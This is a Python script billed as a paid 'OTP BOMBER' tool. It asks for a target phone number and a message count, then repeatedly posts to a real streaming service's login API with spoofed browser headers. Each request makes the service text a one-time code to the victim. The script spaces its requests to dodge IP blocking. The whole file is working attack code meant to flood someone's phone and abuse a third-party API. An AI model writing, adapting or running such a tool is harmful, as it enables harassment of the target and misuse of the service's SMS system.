import requests
import os
import time
import uuid

def start():
    os.system('clear')
    # Tool Logo
    print('          \033[1;32m██████  \033[1;31m████████ \033[1;32m██████  ')
    print('         ██    ██    ██    ██   ██ ')
    print('         ██    ██    ██    ██████  ')
    print('         ██    ██    ██    ██      ')
    print('          ██████     ██    ██      \033[0m')
    
    # Information Box
    line = "\033[1;32m×××××××××××××××××××××××××××××××××××××××××××××\033[0m"
    print(line)
    print('\033[1;34m| [✓] DEVELOPED BY :  MD MALEK ISLAM        |')
    print('| [✓] TEAM         :  X-BOOM TEAM           |')
    print('| [✓] TOOL STATUS  :  OTP BOMBER            |')
    print('| [✓] GITHUB       :  MR-MALEK              |')
    print('| [✓] TOOL VERSION :  MAX PRO 2026          |\033[0m')
    print(line)
    
    # System Status
    print('\033[1;32m[•] SYSTEM STATUS: ONLINE...................\033[0m')
    print(line)
    
    # Key Generator
    u_key = str(uuid.uuid4())[:8]
    print(f'\033[1;32m[!] PREMIUM TOOL - 10 DAYS ONLY 50TK [!]')
    print(f'[!] KEY : {u_key}-MR-MALEK')
    print(f'[!] COPY YOUR KEY & SEND TO ADMIN [!]\033[0m')
    print(line)

    # Input Section
    target = input('\n\033[1;32m[+] ENTER TARGET NUMBER: \033[0m')
    amount = int(input('\033[1;32m[+] ENTER SMS AMOUNT: \033[0m'))
    
    print(f'\n\033[1;32m[*] Initializing Attack: True')
    print('[*] Target Locked: Successfully\033[0m\n')
    
    # API Configuration (Chorki)
    url = "https://api-dynamic.chorki.com/v2/auth/login"
    params = {"country": "BD", "platform": "web", "language": "en"}
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Origin": "https://www.chorki.com",
        "Referer": "https://www.chorki.com/"
    }
    payload = {"number": target}

    for i in range(1, amount + 1):
        try:
            # Request Execution
            response = requests.post(url, params=params, json=payload, headers=headers, timeout=10)
            
            if response.status_code == 200 or response.status_code == 201:
                print(f'\033[1;32m[{i}] STATUS: SUCCESS ==> {target}\033[0m')
            else:
                print(f'\033[1;31m[{i}] STATUS: FAILED (CODE: {response.status_code})\033[0m')
        except Exception as e:
            print(f'\033[1;31m[{i}] ERROR: {e}\033[0m')
        
        # Delay to prevent IP blocking
        if i < amount:
            print(f'\033[1;34m[*] cooldown: 60 seconds...\033[0m')
            time.sleep(60)

    print(f"\n{line}")
    print("\033[1;32m[!] MISSION COMPLETED\033[0m")
    print(line)

if __name__ == "__main__":
    start()
